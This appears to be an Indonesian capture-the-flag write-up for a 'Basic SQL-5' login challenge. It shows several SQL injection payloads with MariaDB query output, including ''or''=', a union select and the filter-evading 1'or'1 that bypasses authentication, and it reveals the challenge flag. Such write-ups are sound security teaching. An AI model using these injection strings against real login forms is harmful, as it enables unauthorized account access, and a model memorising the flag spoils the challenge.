<h1><b>Basic SQL-5</h1></b>
<pre>
Login Form (Username & Password)
</pre>
</b><h3>Solution</h3></b>
<p>Lakukan injection sederhana <b>'or''='</b> yang akan me-return nilai 1(True) untuk username dan password, berikut eksekusi pada mysql dan form</p>

```mysql
MariaDB [CTF]> select * from SQL_Challenge6 where username=''or''='' and password=''or''='';
+----------+-----------------------------+
| username | password                    |
+----------+-----------------------------+
| admin    | *************************** |
+----------+-----------------------------+
1 row in set (0.000 sec)

MariaDB [CTF]> select ''or''='' and ''or''='';
+-------------------------+
| ''or''='' and ''or''='' |
+-------------------------+
|                       1 |
+-------------------------+
1 row in set, 5 warnings (0.000 sec)

```
<pre align='center'>
<b>Illegal Character Detected</b>
</pre>
<p>Ternyata hasilnya gagal dengan pesan diatas, yang memungkinkan terdapat filter string pada username dan password</p>
<p align='justify'>Selanjutnya, mari kita coba dengan injection tanpa tanda komentar "# atau -- -" yang akan membypass bagian password, dan berikut hasilnya</p>

```mysql
MariaDB [CTF]> select * from SQL_Challenge6 where username = 'admin';
+----------+-----------------------------+
| username | password                    |
+----------+-----------------------------+
| admin    | VenomCTF{4lm0st_a11_Filt3r} |
+----------+-----------------------------+
1 row in set (0.000 sec)
```
<pre align='center'>
<b>Illegal Character Detected</b>
</pre>
<p>Ternyata hasilnya masih sama dengan sebelumnya, juga terdapat filter</p>
<p>Sekarang mari kita coba dengan union injection "1' union select 1,2#" dan hasilnya masih sama</p>
<p align='justify'>Terakhir, dari beberapa filter yang terjadi, filter yang memungkinan yaitu [=,#,-- -,select], sekarang kita akan melakukan injection biasa tanpa string yang sudah difilter, dengan perintah <b>1'or'1</b> pada username dan password yang juga menghasilkan nilai 1(True). Berikut hasilnya</p>

```mysql
MariaDB [CTF]> select * from SQL_Challenge6 where username='1'or'1' and password='1'or'1';
+----------+-----------------------------+
| username | password                    |
+----------+-----------------------------+
| admin    | VenomCTF{4lm0st_a11_Filt3r} |
+----------+-----------------------------+
1 row in set (0.000 sec)

MariaDB [CTF]> select '1'or'1' and '1'or'1';
+-----------------------+
| '1'or'1' and '1'or'1' |
+-----------------------+
|                     1 |
+-----------------------+
1 row in set (0.000 sec)
```
<pre align='center'>
<b>Your login success
Welcome admin, Flag VenomCTF{4lm0st_a11_Filt3r}</b>
</pre>
<p>Hasilnya succes, ternyata string [',or] tidak terfilter oleh fungsi php</p>
</b><h3>Flag</h3></b>
<pre>
VenomCTF{4lm0st_a11_Filt3r}
</pre>
